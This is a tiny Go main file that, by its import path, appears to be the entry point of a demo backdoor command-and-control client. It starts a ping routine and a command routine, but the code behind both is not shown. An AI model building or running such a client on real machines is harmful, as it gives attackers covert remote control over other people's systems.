package main

import "SafeDp/backdoor/command-control-demo/client/util"

func main() {
	go util.Ping()
	util.Command()
}